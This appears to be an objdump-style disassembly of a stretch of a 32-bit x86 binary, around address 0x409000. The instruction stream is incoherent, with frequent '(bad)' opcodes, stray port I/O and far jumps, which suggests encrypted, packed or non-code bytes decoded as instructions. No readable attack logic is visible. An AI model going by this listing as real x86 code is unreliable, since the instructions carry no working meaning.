  409036:	pop    es
  409037:	mov    esp,0x73b98e11
  40903c:	int    0x1
  40903e:	xor    BYTE PTR [eax],al
  409040:	push   ss
  409041:	aas    
  409042:	mov    eax,ds:0xf5a751a6
  409047:	add    al,0xca
  409049:	xchg   edx,eax
  40904a:	sbb    BYTE PTR [edi],bl
  40904c:	in     eax,0xf9
  40904e:	xlat   BYTE PTR ds:[ebx]
  40904f:	mov    al,0xa5
  409051:	mov    esi,0xe57ff018
  409056:	mov    bl,0x4d
  409058:	arpl   WORD PTR [esi-0x4a],di
  40905b:	jge    0x408ffc
  40905d:	add    esp,DWORD PTR [edx]
  40905f:	dec    esp
  409060:	dec    eax
  409061:	push   eax
  409062:	mov    eax,ds:0xcd5be834
  409067:	jg     0x4090cd
  409069:	dec    esp
  40906a:	mov    bh,0x8c
  40906c:	add    esi,esi
  40906e:	sbb    eax,0xdc2702e9
  409073:	inc    ebx
  409074:	adc    DWORD PTR [ebx+0x23],ebp
  409077:	mov    al,ds:0x3a49f5da
  40907c:	pop    ds
  40907d:	jmp    0x62d16f8f
  409082:	pop    ss
  409083:	bound  esi,QWORD PTR [esi-0x67b406e5]
  409089:	in     eax,dx
  40908a:	jge    0x4090ca
  40908c:	loope  0x409091
  40908e:	mov    DWORD PTR [ebx+ebp*2-0x3f],edi
  409092:	repz bound edx,QWORD PTR [ebx]
  409095:	sbb    cl,bl
  409097:	loope  0x4090ef
  409099:	aas    
  40909a:	lock mov bl,0xc9
  40909d:	push   ebp
  40909e:	push   eax
  40909f:	mov    esp,0x7f5ab2a6
  4090a4:	sub    eax,0x7b0a243a
  4090a9:	(bad)  
  4090aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090ab:	add    ah,BYTE PTR [edx-0x78d9517b]
  4090b1:	push   es
  4090b2:	les    esp,FWORD PTR [edi+0x140fce42]
  4090b8:	imul   ebx,DWORD PTR [ebx+0x7],0x35
  4090bc:	cmp    eax,0x657a5434
  4090c1:	xchg   edx,eax
  4090c2:	xor    al,0xb5
  4090c4:	ins    DWORD PTR es:[edi],dx
  4090c5:	add    DWORD PTR [eax+0x2],edx
  4090c8:	(bad)  
  4090c9:	pop    edx
  4090ca:	push   ecx
  4090cb:	addr16 dec edi
  4090cd:	mov    ebp,0x564bd20f
  4090d2:	call   0x761d8686
  4090d7:	lods   eax,DWORD PTR ds:[esi]
  4090d8:	mov    esp,0xc3901d60
  4090dd:	jno    0x4090a0
  4090df:	inc    ebx
  4090e0:	push   ecx
  4090e1:	mov    dh,BYTE PTR [ecx]
  4090e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090e4:	repz add eax,0xd85ffb5c
  4090ea:	add    DWORD PTR [ecx+0x61],ebp
  4090ed:	ins    DWORD PTR es:[edi],dx
  4090ee:	scas   ax,WORD PTR es:[edi]
  4090f0:	loopne 0x409171
  4090f2:	inc    esi
  4090f3:	dec    edx
  4090f4:	pop    ebx
  4090f5:	xor    dl,BYTE PTR [edi+0x3712a783]
  4090fb:	hlt    
  4090fc:	adc    BYTE PTR [edx+0x26],ch
  4090ff:	adc    eax,0xe690f335
  409104:	xchg   ebp,eax
  409105:	add    al,dh
  409107:	dec    ebp
  409108:	push   ebp
  409109:	test   eax,0xbebf0552
  40910e:	jnp    0x409168
  409110:	push   es
  409111:	scas   eax,DWORD PTR es:[edi]
  409112:	and    al,0x7c
  409114:	call   0x31016883
  409119:	mov    bh,0x33
  40911b:	add    ebx,DWORD PTR [ebp+edx*2-0x5a]
  40911f:	mov    ?,WORD PTR [edx+0x5e]
  409122:	mov    edx,DWORD PTR [edx]
  409124:	bound  esp,QWORD PTR [esi-0x5c]
  409127:	icebp  
  409128:	jne    0x4091a8
  40912a:	mov    ds:0x436dbb0a,al
  40912f:	add    eax,DWORD PTR [ebx+eax*8-0x6c]
  409133:	out    dx,eax
  409134:	inc    esp
  409135:	fimul  DWORD PTR [ecx]
  409137:	and    dh,BYTE PTR [edi+0x41cbfcc8]
  40913d:	add    bl,BYTE PTR [edx]
  40913f:	or     eax,0xe0a50505
  409144:	cmp    BYTE PTR [edx+0x65aea243],al
  40914a:	sbb    BYTE PTR [edi-0x5bc6f51],0xf3
  409151:	push   ecx
  409152:	or     al,0x8d
  409154:	into   
  409155:	jmp    0x5c4c:0x43e10190
  40915c:	ss sti 
  40915e:	into   
  40915f:	stos   BYTE PTR es:[edi],al
  409160:	int    0xfb
  409162:	dec    ebp
  409163:	mov    bl,0x33
  409165:	dec    edx
  409166:	out    0x23,al
  409168:	repnz addr16 dec eax
  40916b:	repnz inc eax
  40916d:	rcr    DWORD PTR [edx+0x5ab652c0],1
  409173:	out    0x1f,al
  409175:	add    DWORD PTR ds:0xc37ab3bb,ebx
  40917b:	jbe    0x40911f
  40917d:	or     al,0xe4
  40917f:	sahf   
  409180:	in     eax,0x86
  409182:	dec    esi
  409183:	dec    ecx
  409184:	test   bl,dl
  409186:	(bad)  
  409187:	mul    DWORD PTR [ebx+0x10]
  40918a:	rol    DWORD PTR ds:0xa3f2e49a,0xc3
  409191:	aam    0x88
  409193:	imul   edi,DWORD PTR [ebp-0x751d3bfa],0x51
  40919a:	cs ja  0x40920a
  40919d:	pop    ebp
  40919e:	loopne 0x4091bf
  4091a0:	mov    edx,ds
  4091a2:	lods   eax,DWORD PTR ds:[esi]
  4091a3:	add    edx,esp
  4091a5:	jecxz  0x4091e2
  4091a7:	mov    bl,al
  4091a9:	sub    al,0x4d
  4091ab:	aam    0xa4
  4091ad:	js     0x40919f
  4091af:	test   ah,bh
  4091b1:	test   edi,0x8ce64429
  4091b7:	xchg   ebx,eax
  4091b8:	jmp    0x17c7:0x36791caf
  4091bf:	push   esi
  4091c0:	ret    0x470a
  4091c3:	pop    ebx
  4091c4:	jle    0x409146
  4091c6:	icebp  
  4091c7:	mov    al,ds:0x7e27ec81
  4091cc:	loop   0x409206
  4091ce:	mov    ds:0xb290b2e1,al
  4091d3:	push   edx
  4091d4:	pop    es
  4091d5:	ret    
  4091d6:	ins    BYTE PTR es:[edi],dx
  4091d7:	hlt    
  4091d8:	pop    es
  4091d9:	out    dx,al
  4091da:	push   ebx
  4091db:	mov    ds:0x673db68e,eax
  4091e0:	stc    
  4091e1:	dec    ebx
  4091e2:	sti    
  4091e3:	push   ebx
  4091e4:	test   DWORD PTR [ebp-0xb],esi
  4091e7:	les    edx,FWORD PTR [esi]
  4091e9:	stos   BYTE PTR es:[edi],al
  4091ea:	ror    BYTE PTR ds:0xfb2369fa,1
  4091f0:	xchg   DWORD PTR ds:0x9c3022d0,ecx
  4091f6:	dec    ebx
  4091f7:	(bad)  
  4091f8:	mov    eax,ds:0x539c385a
  4091fd:	or     DWORD PTR [edx+0x25],ebp
  409200:	je     0x409279
  409202:	and    esp,DWORD PTR [esi]
  409204:	daa    
  409205:	fcomip st,st(4)
  409207:	out    dx,eax
  409208:	ret    0x98f0
  40920b:	xchg   esi,eax
  40920c:	fmul   QWORD PTR [esi+edi*1-0x3c]
  409210:	mov    edx,0x392ac642
  409215:	lds    ebx,FWORD PTR [ebx]
  409217:	push   edi
  409218:	adc    al,0x5a
  40921a:	fcompp 
  40921c:	rol    dx,0x0
  409220:	es jmp 0x40920a
  409223:	cld    
  409224:	(bad)  
  409225:	outs   dx,BYTE PTR ds:[esi]
  409226:	push   es
  409227:	cli    
  409228:	aas    
  409229:	xchg   DWORD PTR [eax+0x6f3e7e35],ebx
  40922f:	mov    DWORD PTR [ebx],esp
  409231:	xor    cl,bl
  409233:	int    0x6f
  409235:	cmp    BYTE PTR [eax+0x57e8c9d3],bh
  40923b:	dec    ebx
  40923c:	dec    edx
  40923d:	pop    edi
  40923e:	cmc    
  40923f:	jno    0x409282
  409241:	push   ds
  409242:	dec    edi
  409243:	sbb    DWORD PTR [edx+0x16],edx
  409246:	cwde   
  409247:	xchg   ecx,eax
  409248:	scas   eax,DWORD PTR es:[edi]
  409249:	dec    eax
  40924a:	out    dx,eax
  40924b:	jae    0x4092bf
  40924d:	loopne 0x409279
  40924f:	test   DWORD PTR [eax-0x6e],ebx
  409252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409253:	xchg   esp,eax
  409254:	xchg   esi,eax
  409255:	xlat   BYTE PTR ds:[ebx]
  409256:	outs   dx,BYTE PTR cs:[esi]
  409258:	in     al,dx
  409259:	add    BYTE PTR [ecx+0x2ddacc70],0xed
  409260:	jmp    0x40921d
  409262:	and    ah,dh
  409264:	repz aaa 
  409266:	test   eax,0x30442508
  40926b:	data16 xchg BYTE PTR [edi+0x75f75489],bl
  409272:	mul    BYTE PTR [ecx-0x39d52f39]
  409278:	jae    0x40926d
  40927a:	inc    esp
  40927b:	clc    
  40927c:	jo     0x40922e
  40927e:	sahf   
  40927f:	stos   DWORD PTR es:[edi],eax
  409280:	ret    0x74ad
  409283:	enter  0x766f,0x20
  409287:	xlat   BYTE PTR ds:[ebx]
  409288:	rol    DWORD PTR [edx],0x41
  40928b:	push   ecx
  40928c:	pop    es
  40928d:	xor    ch,BYTE PTR [ebx-0x79bb6c5d]
  409293:	std    
  409294:	pop    ebx
  409295:	(bad)  
  409296:	xlat   BYTE PTR ds:[ebx]
  409297:	cmp    esi,DWORD PTR [ecx]
  409299:	xchg   eax,ebp
  40929b:	pop    esi
  40929c:	push   cs
  40929d:	pop    ebx
  40929e:	ss dec esp
  4092a0:	loopne 0x409319
  4092a2:	test   BYTE PTR [ecx-0x2499a054],cl
  4092a8:	push   cs
  4092a9:	cmp    dh,BYTE PTR [ecx-0x39]
  4092ac:	dec    esp
  4092ad:	clc    
  4092ae:	lods   eax,DWORD PTR ds:[esi]
  4092af:	nop
  4092b0:	lods   al,BYTE PTR ds:[esi]
  4092b1:	shl    DWORD PTR [edx-0x4c8f9517],cl
  4092b7:	retf   
  4092b8:	pop    dx
  4092ba:	xchg   BYTE PTR [ebp*2-0xd609072],dh
  4092c1:	js     0x4092a8
  4092c3:	out    0x10,al
  4092c5:	sar    DWORD PTR [esi-0x6c6da0f5],1
  4092cb:	xchg   edi,eax
  4092cc:	fcomip st,st(3)
  4092ce:	push   ebp
  4092cf:	mov    eax,0xc31d9d20
  4092d4:	ins    DWORD PTR es:[edi],dx
  4092d5:	jecxz  0x409334
  4092d7:	inc    edx
  4092d8:	inc    eax
  4092d9:	ret    
  4092da:	pop    edx
  4092db:	adc    BYTE PTR [edx],dl
  4092dd:	test   eax,0x67e5c739
  4092e2:	loop   0x4092fa
  4092e4:	jge    0x40929e
  4092e6:	or     eax,0x61e9a868
  4092eb:	test   al,0x1f
  4092ed:	das    
  4092ee:	imul   edi,DWORD PTR [ebp-0x7d],0x2f
  4092f2:	data16 adc al,0x9b
  4092f5:	neg    ecx
  4092f7:	xrelease xchg DWORD PTR ds:0x8e1c5054,edi
  4092fe:	dec    edx
  4092ff:	sbb    esi,esi
  409301:	sbb    al,0x52
  409303:	imul   ecx,DWORD PTR [ecx+0x722d405],0xffffffff
  40930a:	pop    edx
  40930b:	ins    DWORD PTR es:[edi],dx
  40930c:	test   al,0xe1
  40930e:	lock dec ebx
  409310:	call   FWORD PTR [esi]
  409312:	jae    0x409317
  409314:	mov    cl,0x78
  409316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409317:	xchg   ebx,eax
  409318:	cmc    
  409319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40931a:	jbe    0x409379
  40931c:	loop   0x40931a
  40931e:	iret   
  40931f:	out    0x46,al
  409321:	mov    esi,0xa5cb64f1
  409326:	mov    cl,BYTE PTR [esi-0x3e]
  409329:	dec    edx
  40932a:	rcl    DWORD PTR ds:0x2485e5cd,cl
  409330:	aas    
  409331:	add    bh,BYTE PTR [ecx+0x27bcb4e1]
  409337:	jl     0x4093b5
  409339:	iret   
  40933a:	in     eax,0xa0
  40933c:	aad    0x65
  40933e:	and    cl,ah
  409340:	cmp    DWORD PTR [ebx+0x24c9616b],ebp
  409346:	sahf   
  409347:	push   edi
  409348:	mov    BYTE PTR [ebx],ah
  40934a:	int3   
  40934b:	pop    edx
  40934c:	push   ebp
  40934d:	dec    ecx
  40934e:	fisub  DWORD PTR [ebx-0x5d]
  409351:	inc    esi
  409352:	ins    DWORD PTR es:[edi],dx
  409353:	sbb    BYTE PTR [edi],cl
  409355:	push   edx
  409356:	xchg   edi,eax
  409357:	in     eax,0x62
  409359:	push   ebp
  40935a:	cli    
  40935b:	shl    BYTE PTR [ecx+0x73a37901],cl
  409361:	dec    edx
  409362:	fistp  WORD PTR [edi-0x404fa27d]
  409368:	mov    ah,0x32
  40936a:	push   es
  40936b:	imul   esi
  40936d:	cdq    
  40936e:	jno    0x40939b
  409370:	cwde   
  409371:	(bad)  
  409372:	pinsrw mm4,WORD PTR [ecx],0x58
  409376:	sbb    eax,0xcaa0c3d7
  40937b:	data16 (bad) 
  40937d:	cmp    esp,DWORD PTR [ebx+0x73878c6]
  409383:	fisttp DWORD PTR [ebx]
  409385:	(bad)  
  409386:	mov    ?,WORD PTR [ecx+esi*1+0x1bf7aae3]
  40938d:	inc    eax
  40938e:	pop    ebp
  40938f:	jne    0x4093c3
  409391:	xor    al,0x60
  409393:	push   ecx
  409394:	sahf   
  409395:	push   es
  409396:	mov    eax,ds:0xa63ddf6a
  40939b:	xchg   ecx,eax
  40939c:	clc    
  40939d:	leave  
  40939e:	dec    esi
  40939f:	fild   WORD PTR [edx-0x49f7bf06]
  4093a5:	inc    esp
  4093a6:	loopne 0x409374
  4093a8:	and    al,0x1a
  4093aa:	jb     0x4093cb
  4093ac:	or     BYTE PTR [eax],bl
  4093ae:	xchg   DWORD PTR [ebp+edx*8+0x13a24699],ebp
  4093b5:	push   0x773c8bc7
  4093ba:	ins    BYTE PTR es:[edi],dx
  4093bb:	ja     0x40941c
  4093bd:	mov    WORD PTR [edx],es
  4093bf:	outs   dx,BYTE PTR fs:[esi]
  4093c1:	call   0xae34:0x131ee8bf
  4093c8:	jmp    0x409434
  4093ca:	sub    dl,BYTE PTR [edi]
  4093cc:	cmp    DWORD PTR [eax],esi
  4093ce:	jecxz  0x4093e2
  4093d0:	scas   al,BYTE PTR es:[edi]
  4093d1:	(bad)  
  4093d2:	hlt    
  4093d3:	aad    0xaa
  4093d5:	fiadd  DWORD PTR [eax+0x29]
  4093d8:	mov    DWORD PTR [eax-0x2a],ebp
  4093db:	popf   
  4093dc:	lods   al,BYTE PTR ds:[esi]
  4093dd:	out    0xfe,al
  4093df:	bound  ecx,QWORD PTR [esi+esi*1]
  4093e2:	shr    BYTE PTR [esi+0x5265373e],1
  4093e8:	mov    ebp,DWORD PTR [eax+eiz*4+0x19]
  4093ec:	hlt    
  4093ed:	scas   eax,DWORD PTR es:[edi]
  4093ee:	(bad)  [ecx-0x10bab12c]
  4093f4:	pusha  
  4093f5:	mov    bl,0x8d
  4093f7:	pop    esp
  4093f8:	pop    ss
  4093f9:	aad    0xbc
  4093fb:	xchg   esi,eax
  4093fc:	sbb    esp,DWORD PTR [ecx-0x73d3c5f3]
  409402:	out    dx,eax
  409403:	push   0xfffffffc
  409405:	shl    DWORD PTR [ebx-0x36],1
  409408:	aas    
  409409:	sahf   
  40940a:	div    bh
  40940c:	sub    eax,0xd11af774
  409411:	and    eax,0x3a6b69e2
  409416:	bound  edx,QWORD PTR [ecx-0x65f1d801]
  40941c:	stos   DWORD PTR es:[edi],eax
  40941d:	retf   0xec66
  409420:	and    al,0x3e
  409422:	sbb    edi,DWORD PTR ds:0x3fcb950f
  409428:	xor    BYTE PTR [ecx+0x12],cl
  40942b:	jmp    0xd91e1531
  409430:	out    0x87,al
  409432:	aam    0x82
  409434:	xchg   esp,eax
  409435:	in     al,0x26
  409437:	or     ch,0x44
  40943a:	repz push ss
  40943c:	push   edx
  40943d:	sbb    edx,ebp
  40943f:	cmp    eax,0x3306fcf1
  409444:	cld    
  409445:	js     0x4094b8
  409447:	in     eax,0xeb
  409449:	in     al,0xa4
  40944b:	adc    DWORD PTR [ebx-0x77d3735c],0xfffffff5
  409452:	stos   BYTE PTR es:[edi],al
  409453:	xor    esp,DWORD PTR [edi]
  409455:	xor    eax,0x4e96d672
  40945a:	jnp    0x4093f5
  40945c:	mov    WORD PTR [ebx-0x143e2233],ds
  409462:	xor    cl,cl
  409464:	mov    edx,DWORD PTR [ebp+0x76]
  409467:	es aas 
  409469:	inc    ebp
  40946a:	stos   BYTE PTR es:[edi],al
  40946b:	xor    al,al
  40946d:	mov    DWORD PTR [eax+ecx*1],0xac709863
  409474:	mov    BYTE PTR [esi-0x34],dh
  409477:	and    BYTE PTR [ecx],dh
  409479:	sub    al,bh
  40947b:	xor    esp,ecx
  40947d:	mov    ds:0x76817427,eax
  409482:	aam    0x3a
  409484:	mov    ebp,0x8512a04d
  409489:	rcl    BYTE PTR [eax+0x7b],1
  40948c:	aaa    
  40948d:	call   0xfc8f:0x5408fc48
  409494:	enter  0x51e5,0x4e
  409498:	test   al,0x10
  40949a:	mov    eax,ds:0x4074b711
  40949f:	repnz xchg ah,al
  4094a2:	xchg   ecx,eax
  4094a3:	jae    0x40945d
  4094a5:	lock nop
  4094a7:	xchg   esp,eax
  4094a8:	jmp    0x409442
  4094aa:	pop    edx
  4094ab:	mov    ecx,0x6da3ea4
  4094b0:	add    cl,dh
  4094b2:	shl    BYTE PTR [eax+0x1f2401ad],cl
  4094b8:	test   al,0x1f
  4094ba:	dec    edx
  4094bb:	fdivr  DWORD PTR [ebx]
  4094bd:	scas   al,BYTE PTR es:[edi]
  4094be:	add    DWORD PTR [ebx+0x32],ecx
  4094c1:	pop    ebp
  4094c2:	or     ch,0x53
  4094c5:	aad    0x24
  4094c7:	adc    al,0x3
  4094c9:	or     edx,esi
  4094cb:	not    DWORD PTR [edx]
  4094cd:	pop    ebp
  4094ce:	mov    esi,0x20a023c2
  4094d3:	xor    eax,0xe624d5c
  4094d8:	outs   dx,DWORD PTR ds:[esi]
  4094d9:	cdq    
  4094da:	adc    ebp,DWORD PTR [edi+edi*2+0x7bb3536b]
  4094e1:	cwde   
  4094e2:	sbb    al,0xab
  4094e4:	add    BYTE PTR [ebx+edx*8+0x68],ch
  4094e8:	aas    
  4094e9:	push   eax
  4094ea:	lods   eax,DWORD PTR ds:[esi]
  4094eb:	pop    eax
  4094ec:	call   0x4f1c:0xa25255d5
  4094f3:	pop    edx
  4094f4:	cs aam 0xb
  4094f7:	retf   0x59fd
  4094fa:	xchg   ecx,eax
  4094fb:	dec    edi
  4094fc:	add    BYTE PTR [esi+0x3d1937ee],cl
  409502:	xor    BYTE PTR [eax-0x16],ch
  409505:	dec    esi
  409506:	in     al,0x88
  409508:	fidiv  WORD PTR ss:[esi-0x74a56931]
  40950f:	jno    0x4094e3
  409511:	ds pop ds
  409513:	sub    ecx,DWORD PTR cs:[edi+0x65]
  409517:	test   DWORD PTR [edx-0x3d],ebx
  40951a:	inc    edi
  40951b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40951c:	mov    ebx,0x12b71f2e
  409521:	mov    al,0x14
  409523:	mov    edi,edx
  409525:	or     DWORD PTR [eax],esp
  409527:	push   edx
  409528:	and    al,ah
  40952a:	sub    BYTE PTR [ebx+0x3532af58],dh
  409530:	mov    ah,0xa7
  409532:	mov    ah,0xe0
  409534:	arpl   di,si
  409536:	push   ds
  409537:	mov    ebx,0xef4eb273
  40953c:	iret   
  40953d:	jnp    0x4094f0
  40953f:	pop    edi
  409540:	stos   DWORD PTR es:[edi],eax
  409541:	xor    eax,0x257b5968
  409546:	test   DWORD PTR [edx],eax
  409548:	es jg  0x409516
  40954b:	cmp    esi,esi
  40954d:	sbb    al,0x3d
  40954f:	adc    bl,ch
  409551:	sub    ch,ah
  409553:	aad    0x70
  409555:	jle    0x40956a
  409557:	add    al,0x56
  409559:	jg     0x4095a1
  40955b:	test   BYTE PTR [esi+0x3a229e32],dh
  409561:	loopne 0x4095db
  409563:	and    DWORD PTR [ecx+0x26],esi
  409566:	xchg   esi,eax
  409567:	(bad)  
  409568:	outs   dx,BYTE PTR ds:[esi]
  409569:	inc    edx
  40956a:	xor    DWORD PTR [ecx],edx
  40956c:	adc    bl,BYTE PTR [edi+eax*2+0x67b4f59f]
  409573:	push   cs
  409574:	mov    ecx,0x22950e8a
  409579:	jle    0x40958c
  40957b:	mov    bl,0x2e
  40957d:	mov    eax,ds:0x94e4d71b
  409582:	clc    
  409583:	inc    edi
  409584:	mov    ecx,DWORD PTR [eax-0x58960f02]
  40958a:	adc    BYTE PTR [ebp+0x1f],0xec
  40958e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40958f:	fstp   DWORD PTR [edx]
  409591:	out    0x19,al
  409593:	fcmovnb st,st(2)
  409595:	mov    ds:0xe0d1b1c8,al
  40959a:	jmp    0xb4bde720
  40959f:	xchg   DWORD PTR [eax+ebp*8-0x28],edi
  4095a3:	sub    dl,ch
  4095a5:	sbb    DWORD PTR [ecx+ebp*1-0x7e4faf55],esp
  4095ac:	mov    ds:0xb09bbce7,eax
  4095b1:	rol    BYTE PTR [edx],1
  4095b3:	lea    ecx,[ebx+0x4640cbe0]
  4095b9:	dec    ebx
  4095ba:	fld    DWORD PTR [ebp-0x2c]
  4095bd:	fst    DWORD PTR [esi+0x31]
  4095c0:	call   0x4b1f0caf
  4095c5:	push   edi
  4095c6:	scas   eax,DWORD PTR es:[edi]
  4095c7:	in     eax,dx
  4095c8:	test   al,0x6d
  4095ca:	or     al,BYTE PTR [ebx-0xc]
  4095cd:	rcl    DWORD PTR [esp+eax*8],cl
  4095d0:	inc    edi
  4095d1:	js     0x40959f
  4095d3:	jp     0x4095d3
  4095d5:	xchg   esi,eax
  4095d6:	xor    eax,0x78edd88f
  4095db:	int3   
  4095dc:	mov    WORD PTR [edx+0x1d00d1a8],ss
  4095e2:	sbb    bh,0xb4
  4095e5:	inc    ebp
  4095e6:	mov    al,0xd7
  4095e8:	sti    
  4095e9:	xchg   esp,eax
  4095ea:	xchg   esp,eax
  4095eb:	div    DWORD PTR [edx+0x71c03600]
  4095f1:	into   
  4095f2:	dec    edx
  4095f3:	(bad)  
  4095f4:	rcr    BYTE PTR [ecx-0x72ebf637],1
  4095fa:	add    dh,dl
  4095fc:	inc    edx
  4095fd:	neg    BYTE PTR [edx+ebp*8+0x5b3a96c8]
  409604:	jecxz  0x40964f
  409606:	mov    ah,0x66
  409608:	loope  0x4095b1
  40960a:	stos   WORD PTR es:[edi],ax
  40960c:	in     al,0x13
  40960e:	fcomp  DWORD PTR [ebp-0x5f800e68]
  409614:	inc    esp
  409615:	rcr    DWORD PTR [esi-0x841bdf0],0x2c
  40961c:	aaa    
  40961d:	pop    esp
  40961e:	addr16 xor eax,0x6cc3130b
  409624:	sahf   
  409625:	add    edx,esi
  409627:	jg     0x40962b
  409629:	retfw  0xf831
  40962d:	xchg   BYTE PTR [esp+esi*4+0x184fa84f],bl
  409634:	cmp    eax,edx
  409636:	mov    edi,0x93b000e7
  40963b:	adc    DWORD PTR [edi],ebp
  40963d:	data16 das 
  40963f:	leave  
  409640:	jmp    0x41ef:0x275a8677
  409647:	dec    edi
  409648:	sbb    bl,BYTE PTR [ebx-0x5b]
  40964b:	fdiv   DWORD PTR [esi-0x1e055c85]
  409651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409652:	pusha  
  409653:	mov    al,0xd4
  409655:	out    dx,al
  409656:	or     eax,ebx
  409658:	pop    ebx
  409659:	or     BYTE PTR [eax+0x23],0x10
  40965d:	(bad)  
  40965e:	inc    BYTE PTR ds:0x828b47e9
  409664:	pop    eax
  409665:	pop    es
  409666:	pop    ds
  409667:	lods   al,BYTE PTR ds:[esi]
  409668:	dec    ebx
  409669:	or     dh,BYTE PTR [esi-0x43]
  40966c:	inc    ebp
  40966d:	aas    
  40966e:	shl    DWORD PTR [ecx],0xd1
  409671:	inc    edx
  409672:	mov    bh,0xc0
  409674:	pop    esi
  409675:	call   0xd0d20e98
  40967a:	or     eax,0xb769eead
  40967f:	neg    BYTE PTR [edx]
  409681:	mov    BYTE PTR [edi-0x40059870],dl
  409687:	sub    al,0x12
  409689:	xchg   esi,eax
  40968a:	mov    edx,0x2fd3fa03
  40968f:	es fucomp st(2)
  409692:	(bad)  
  409693:	retf   
  409694:	jmp    0x409631
  409696:	pop    ss
  409697:	enter  0x191d,0xcb
  40969b:	out    dx,eax
  40969c:	pushf  
  40969d:	mov    dl,ah
  40969f:	(bad)  
  4096a0:	adc    eax,0x518af311
  4096a5:	push   ebp
  4096a6:	outs   dx,BYTE PTR ds:[esi]
  4096a7:	lods   eax,DWORD PTR ds:[esi]
  4096a8:	xor    DWORD PTR [eax],edi
  4096aa:	scas   eax,DWORD PTR es:[edi]
  4096ab:	xlat   BYTE PTR ds:[ebx]
  4096ac:	push   ebx
  4096ad:	dec    eax
  4096ae:	(bad)  
  4096af:	mov    ch,0x34
  4096b1:	test   BYTE PTR [eax+0x5ed43f8d],dl
  4096b7:	popf   
  4096b8:	stos   BYTE PTR es:[edi],al
  4096b9:	push   DWORD PTR [edi+0x49]
  4096bc:	enter  0xb14a,0xed
  4096c0:	idiv   DWORD PTR [ebx]
  4096c2:	adc    eax,ebx
  4096c4:	add    ebx,DWORD PTR [eax+eiz*1-0x3d]
  4096c8:	ret    
  4096c9:	addr16 xchg ebp,eax
  4096cb:	jecxz  0x409733
  4096cd:	jns    0x40966d
  4096cf:	lahf   
  4096d0:	jns    0x409672
  4096d2:	test   DWORD PTR [ebp-0x37],edi
  4096d5:	jle    0x40970a
  4096d7:	(bad)  
  4096d8:	mov    gs,WORD PTR [edx-0x6b0fc386]
  4096de:	or     ah,BYTE PTR [esp+eax*4]
  4096e1:	xor    ebx,DWORD PTR [esi-0x47b3c48c]
  4096e7:	xlat   BYTE PTR ds:[ebx]
  4096e8:	push   0xffffffe4
  4096ea:	shl    DWORD PTR [esi+0x21],0x39
  4096ee:	pop    ss
  4096ef:	aas    
  4096f0:	aad    0xbc
  4096f2:	loope  0x4096ac
  4096f4:	sbb    esi,esp
  4096f6:	push   ebp
  4096f7:	das    
  4096f8:	cmp    esi,ecx
  4096fa:	xchg   esi,eax
  4096fb:	test   eax,0x88fad9a0
  409700:	push   ebp
  409701:	lods   eax,DWORD PTR ds:[esi]
  409702:	out    0x48,eax
  409704:	jge    0x4096b2
  409706:	add    ch,BYTE PTR [edi+0x4c]
  409709:	or     dl,dh
  40970b:	ret    
  40970c:	mov    dl,0x3c
  40970e:	test   eax,0xb43677bd
  409713:	int    0x5c
  409715:	mov    bl,0x28
  409717:	or     eax,0xe083453f
  40971c:	(bad)  
  40971d:	xchg   edx,eax
  40971e:	fidiv  DWORD PTR [ebx-0x67ab1f8b]
  409724:	jno    0x4096fd
  409726:	das    
  409727:	and    eax,0x3be6068d
  40972c:	push   ecx
  40972d:	xor    bl,bl
  40972f:	int3   
  409730:	or     BYTE PTR [edx],bl
  409732:	stc    
  409733:	add    al,0x0
  409735:	adc    cl,ah
  409737:	cmp    ebp,DWORD PTR [edx]
  409739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40973a:	xor    BYTE PTR [edx],cl
  40973c:	mov    ah,0x6f
  40973e:	sub    al,0x7e
  409740:	dec    ebp
  409741:	cdq    
  409742:	mov    dl,0xd4
  409744:	(bad)  
  409745:	push   0xffffffd5
  409747:	dec    edi
  409748:	cwde   
  409749:	ja     0x40973f
  40974b:	icebp  
  40974c:	or     ebx,DWORD PTR [ebx-0x44]
  40974f:	es sbb eax,0x876c3af2
  409755:	stos   DWORD PTR es:[edi],eax
  409756:	fwait
  409757:	jne    0x4097ad
  409759:	xchg   ecx,eax
  40975a:	cmp    BYTE PTR [ecx-0xc],ch
  40975d:	jnp    0x40973a
  40975f:	add    ecx,DWORD PTR [ebx]
  409761:	and    BYTE PTR [edx-0x1c3604d8],0xff
  409768:	nop
  409769:	mov    ds:0x28b5e2a3,al
  40976e:	mov    al,0x1f
  409770:	mov    edi,0xbab0cba4
  409775:	daa    
  409776:	pusha  
  409777:	fstp   DWORD PTR [ebp-0x39]
  40977a:	jg     0x40971a
  40977c:	loope  0x40974e
  40977e:	jae    0x40970f
  409780:	adc    DWORD PTR [eax-0x6e],ecx
  409783:	adc    edx,DWORD PTR [ebx+eax*8+0x39d03a36]
  40978a:	mov    bh,0x81
  40978c:	pop    es
  40978d:	jbe    0x409712
  40978f:	out    0x99,eax
  409791:	cmp    al,0x9b
  409793:	and    al,0xa5
  409795:	mov    ebp,0x55714116
  40979a:	loope  0x4097f0
  40979c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40979d:	rcr    dl,cl
  40979f:	rcr    BYTE PTR [ebp-0x77],0xfd
  4097a3:	mov    ebx,0x3a1e62cf
  4097a8:	jp     0x409780
  4097aa:	sub    eax,0x37cea441
  4097af:	mov    edx,DWORD PTR [ebp+0x76]
  4097b2:	enter  0x1a12,0xe0
  4097b6:	xchg   ebx,eax
  4097b7:	pop    edi
  4097b8:	add    al,0xa7
  4097ba:	lods   al,BYTE PTR ds:[esi]
  4097bb:	push   ebx
  4097bc:	push   cs
  4097bd:	xchg   ebp,eax
  4097be:	xor    eax,0xb9ee87e6
  4097c3:	jo     0x40980a
  4097c5:	and    ah,ch
  4097c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097c8:	mov    ch,0x5a
  4097ca:	xlat   BYTE PTR ds:[ebx]
  4097cb:	dec    ebp
  4097cc:	(bad)  
  4097ce:	into   
  4097cf:	and    edx,esi
  4097d1:	leave  
  4097d2:	push   esi
  4097d3:	hlt    
  4097d4:	out    0xa3,al
  4097d6:	xchg   ebx,eax
